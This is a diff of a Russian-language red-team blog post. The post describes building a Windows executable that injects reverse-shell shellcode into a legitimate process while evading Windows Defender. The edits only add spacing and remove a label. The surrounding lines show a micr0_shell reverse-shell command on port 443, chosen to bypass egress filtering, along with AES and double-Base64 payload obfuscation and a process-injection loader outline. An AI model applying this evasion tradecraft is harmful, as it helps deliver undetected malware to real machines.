@@ -27,6 +27,7 @@ categories = ["Cybersecurity", "Red Teaming"]
 
 Создание исполняемого файла (`.exe`), способного доставить шелл-код в память легитимного процесса, минуя статический и динамический анализ Windows Defender.
 
+&nbsp;
 ---
 
 ### Шаг 1: Генерация «сырого» шелл-кода
@@ -34,8 +35,6 @@ categories = ["Cybersecurity", "Red Teaming"]
 Для генерации использовался инструмент `micr0_shell`. Был выбран формат **C** для получения массива байтов.
 
 **Команда:**
-
-Bash
 
 ```
 python3 micr0_shell.py --ip 0.0.0.0 --port 443 --language c
@@ -45,7 +44,7 @@ python3 micr0_shell.py --ip 0.0.0.0 --port 443 --language c
     
 - **Порт**: `443` (используется вместо 4444 для обхода фильтрации исходящего трафика).
     
-
+&nbsp;
 ---
 
 ### Шаг 2: Шифрование нагрузки (AES-128-CBC)
@@ -70,7 +69,7 @@ python3 micr0_shell.py --ip 0.0.0.0 --port 443 --language c
     
 4. **To Base64**: Вторая итерация (двойной Base64 для дополнительной обфускации строки).
     
-
+&nbsp;
 ---
 
 ### Шаг 3: Написание загрузчика на C#
@@ -158,7 +157,7 @@ namespace ProcInj_PEInj
     
 - **Обход эвристики**: Использование функций `VirtualAllocEx` и `CreateRemoteThread`.
     
-
+&nbsp;
 ---
 
 ### Шаг 4: Подготовка метаданных (AssemblyInfo.cs)
@@ -183,7 +182,7 @@ using System.Reflection;
 [assembly: AssemblyVersion("1.0.4.0")]
 [assembly: AssemblyFileVersion("1.0.4.0")]
 ```
-
+&nbsp;
 ---
 
 ### Шаг 5: Компиляция с иконкой
